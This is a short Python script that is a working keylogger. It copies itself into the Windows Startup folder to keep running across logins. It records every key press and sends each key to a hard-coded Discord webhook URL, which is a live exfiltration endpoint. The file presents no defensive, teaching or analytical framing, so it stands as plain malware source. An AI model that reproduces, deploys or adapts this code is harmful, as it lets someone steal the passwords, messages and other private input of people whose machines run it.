import os
import shutil
import sys
import keyboard
import threading
import requests
import json
webhook_url = "https://discordapp.com/api/webhooks/1184606146644947134/iCjUJ6ALD-G_kK4WwQjymH1sCE3JRtWGhnDFhZzdsNe-Y-hV-m6QF225_3JDNdAOMvL4"
resource_lock = threading.Lock()
def on_key_press(e):
    data = {"content": f"{e.name}"}
    headers = {"Content-Type": "application/json"}
    requests.post(webhook_url, data=json.dumps(data), headers=headers)
def move_to_startup():
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    script_path = os.path.abspath(sys.argv[0])
    destination_path = os.path.join(startup_folder, os.path.basename(script_path))
    if script_path.lower() == destination_path.lower():
        zero = 0
    else:
        try:
            shutil.move(script_path, destination_path)
        except Exception as e:
            zero = 0
def groupe1():
    move_to_startup()
def groupe2():
    keyboard.on_press(on_key_press)
    keyboard.wait()
thread1 = threading.Thread(target=groupe1)
thread2 = threading.Thread(target=groupe2)
thread1.start()
thread2.start()
thread1.join()
thread2.join()
